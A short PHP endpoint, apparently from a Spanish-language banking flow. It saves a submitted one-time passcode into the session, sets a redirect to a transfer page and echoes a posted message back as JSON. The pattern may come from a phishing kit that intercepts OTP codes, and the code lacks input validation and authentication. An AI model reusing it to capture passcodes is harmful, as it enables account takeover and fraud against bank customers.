<?php
header("Content-type: application/json; charset=utf-8");
session_start();

if(isset($_POST["otpCode"])){
   $_SESSION["otpCode"] = $_POST["otpCode"];
}

if(isset($_POST["endTrx"])){
   if($_POST["endTrx"] == "finalTransferencia"){
      $_SESSION["urlTo"] = "transfer.php";
   }
}

$result = array("status"=>$_POST["message"]);
echo json_encode($result);